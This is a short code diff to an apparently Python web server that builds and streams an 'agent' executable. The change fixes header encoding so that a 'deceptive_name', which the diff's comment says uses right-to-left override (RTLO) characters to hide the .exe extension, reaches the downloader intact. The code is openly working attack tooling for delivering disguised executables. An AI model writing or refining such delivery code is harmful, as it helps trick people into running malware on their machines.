@@ -9,6 +9,7 @@ import os
 import json
 import csv
 import io
+import urllib.parse
 from datetime import datetime, timedelta
 import subprocess
 import tempfile
@@ -351,10 +352,14 @@ AGENT_IDENTITY={identity}
                 content = f.read()
             
             # 8. Stream back the file
+            # Encode filename for header to avoid latin-1 errors with RTLO
+            filename_quoted = urllib.parse.quote(deceptive_name)
+            content_disposition = f"attachment; filename=\"dali_agent.exe\"; filename*=UTF-8''{filename_quoted}"
+            
             return StreamingResponse(
                 io.BytesIO(content),
                 media_type="application/octet-stream",
-                headers={"Content-Disposition": f"attachment; filename={deceptive_name}"}
+                headers={"Content-Disposition": content_disposition}
             )
             
     except Exception as e:
